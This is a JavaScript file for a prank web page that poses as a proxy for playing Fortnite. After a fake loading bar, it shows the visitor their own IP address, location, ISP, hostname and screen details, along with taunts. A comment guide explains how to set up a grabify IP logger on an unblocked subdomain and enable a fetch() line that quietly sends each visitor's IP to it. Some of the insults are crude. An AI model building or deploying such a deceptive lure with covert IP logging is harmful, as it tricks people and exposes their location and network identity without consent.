async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
async function proxymsg() {
    var proxy_messages = [
        "loading proxy.",
        "loading proxy..",
        "loading proxy...",
        "proxy loaded.",
        "requesting connection.",
        "requesting connection..",
        "requesting connection...",
        "connection request successful.",
        "loading video feed.",
        "loading video feed..",
        "loading video feed...",
        "loaded video feed.",
        "done."
    ];
    var proxy_loading = document.getElementById("proxy-loading");
    for (let i = 0; i < proxy_messages.length; i++) {
        proxy_loading.innerHTML = proxy_messages[i];
        await sleep(1000);
    }
    fake_forknight();
}
async function fake_forknight(){
    document.getElementById("fortnite-loading").classList.remove("hidden");
    document.getElementById("fake-proxy").classList.add("hidden");
    var fortnite_loading_bar = document.getElementById("fortnite-loading-bar");
    var fortnite_loading_bar_fill = document.getElementById("fortnite-loading-bar-fill");
    var fortnite_loading_bar_fill_width = 0;
    for (let i = 0; i < 100; i++) { // add some randomness and pauses to make it look more real
        fortnite_loading_bar_fill_width += Math.floor(Math.random() * 5);
        if (fortnite_loading_bar_fill_width >= 100) {
            fortnite_loading_bar_fill.style.width = "98.5%";
            fortnite_loading_bar_fill.children[0].innerHTML = "100%";
            await sleep(1000);
            fortnite_loading_bar_fill.children[0].innerHTML = "Done!";
            await sleep(1000);
            // time to turn the loading bar to the play button
            fortnite_loading_bar.setAttribute("onclick", "get_rekt()");
            fortnite_loading_bar.style.width = "10%";
            fortnite_loading_bar.style.height = "2em";
            fortnite_loading_bar.style.fontSize = "1.5em";
            fortnite_loading_bar_fill.children[0].innerHTML = "Play!";
            break;
        }
        fortnite_loading_bar_fill.style.width = fortnite_loading_bar_fill_width + "%";
        fortnite_loading_bar_fill.children[0].innerHTML = fortnite_loading_bar_fill_width + "%";
        await sleep(Math.floor(Math.random() * 1000));
    }
}
async function get_rekt() {
    document.getElementById('loading_screen').classList.add("hidden");
    document.getElementById('fortnite-loading').classList.add("hidden");
    document.getElementById('trolled_lol').classList.remove("hidden");

    /*
    GUIDE FOR ACTUALLY LOGGING IP ADDRESSES
    I, @aeiea, do not condone for any harm or illegal activities done with the information provided, and withdraw all responsibility for any damages.
        
    Now, with the legal stuff out of the way, let me show you how to log IPs.
    1: generate a grabify.link logger. you can use any site.
    2: Find a subdomain that is unblocked.
    3: set that to the subdomain.
    You should have a link somewhat like this:
    https:// [blahblah] . [blah] / [blah]
    EG:
    https://shrekis.life/HA7V54N
    Now: 
    Uncomment line 91 or smth(which should look like // fetch('{PUT GRABIFY LINK HERE}');)
    by removing the double-slash('//'), and replace the '{PUT GRABIFY LINK HERE}' with your grabify link.
    
    it should look like:
    fetch('https://shrekis.life/HA7V54N');
    */
    // 🟥🟥REPLACE THE LINE BELOW!!🟥🟥
    // fetch('{PUT GRABIFY LINK HERE}');
    // 🟥🟥REPLACE THE LINE ABOVE!!🟥🟥
    function push_message(message) {
        var trolled_message_container = document.getElementById("trolled");
        var trolled_message = document.createElement("p");
        trolled_message.innerHTML = message;
        trolled_message_container.appendChild(trolled_message);
    }
    
    async function get_ip_data() {
        /* 
        using wtfismyip.com
        example ip
        {
            "YourFuckingIPAddress": "{ip}",
            "YourFuckingLocation": "Los Angeles, CA, United States",
            "YourFuckingHostname": "{hostname}",
            "YourFuckingISP": "Cox Communications Inc.",
            "YourFuckingTorExit": false,
            "YourFuckingCity": "Los Angeles",
            "YourFuckingCountry": "United States",
            "YourFuckingCountryCode": "US"
        }
        */
        const ip_data = await fetch("https://wtfismyip.com/json").then(response => response.json());
        console.log(ip_data);
        return ip_data;
    }
    async function get_cat_fact() {
        /*
        using https://catfact.ninja/fact
        example fact:
        {"fact":"The cat who holds the record for the longest non-fatal fall is Andy. He fell from the 16th floor of an apartment building (about 200 ft\/.06 km) and survived.","length":157}
        */
        const catfact = await fetch("https://catfact.ninja/fact").then(response => response.json()); 
        console.log(catfact);
        console.log(catfact.fact);
        return catfact.fact;
    }
    push_message(await get_cat_fact());
    var trollmessages = [
        "fork",
        "spoon",
        "sus",
        "sus goofy ahh",
        "only in ohio",
        "amogus",
        "goofy ahh",
    ];
    var skilllevelmessages = [
        "unepic gamer",
        "fart",
        "f--",
        "professional scratch game player",
        "professional plants vs zombie player",
        "weeb",
        "incarnation of lankybox🤮🤮🤮🤮🤮🤮🤮🤮🤮🤮",
        "potato++",
        "jeebus crust",
        "professional gacha life player",
        "professional roblox adopt me player",
        "ea game enjoyer",
        "iM a DeVeLoPeR dAd BuY mE gItHuB pReMiUm"
    ];
    var possiblevideos = ["axolotl.mp4", "bigguy.mp4", "bowser.mp4", "cinder.mp4", "dude.mp4", "family.mp4", "finland.webm", "gary.mp4", "iceberg.mp4", "jeebus.mov", "lego.mov", "murder.mp4", "pee.mp4", "penguin.mp4", "perky.mov", "piano.mp4", "pipe.mov", "pop.mp4", "roblonk.mp4", "shampoo.mov", "sus.mp4", "ups.mp4", "video.mp4", "yoshi.mp4"]
    var trollmessage = trollmessages[Math.floor(Math.random() * trollmessages.length)];
    var skilllevelmessage = skilllevelmessages[Math.floor(Math.random() * skilllevelmessages.length)];
    var selectedvideo = possiblevideos[Math.floor(Math.random() * possiblevideos.length)];
    // alert("sus goofy ahh")
    document.getElementsByTagName("title")[0].innerHTML = "sus goofy ahh";
    document.getElementsByTagName("video")[0].src = "videos/" + selectedvideo;
    document.getElementsByTagName("video")[0].play();
    var messages = [
        "you rn: ".concat(trollmessage),
        "skill level: ".concat(skilllevelmessage),
        "ip: ".concat(await get_ip_data().then(response => response.YourFuckingIPAddress)),
        "location: ".concat(await get_ip_data().then(response => response.YourFuckingLocation)),
        "hostname: ".concat(await get_ip_data().then(response => response.YourFuckingHostname)),
        "isp: ".concat(await get_ip_data().then(response => response.YourFuckingISP)),
        "city: ".concat(await get_ip_data().then(response => response.YourFuckingCity)),
        "country: ".concat(await get_ip_data().then(response => response.YourFuckingCountry)),
        "screen h: ".concat(window.screen.availHeight),
        "screen w: ".concat(window.screen.availWidth),
        "referrer: ".concat(document.referrer),
        "raw data: ".concat(await get_ip_data().then(response => JSON.stringify(response))), // raw json so scawy!1!!
        "trolled: true",
        "made by: @aeiea",
        "git: gud",
        "l plus: bozo",
        "u are: stupid"
    ];
    console.log(messages)
    for (let i = 0; i < messages.length; i++) {
        const element = messages[i];
        console.log(element)
        push_message(element);
        await sleep(500);
    }
}
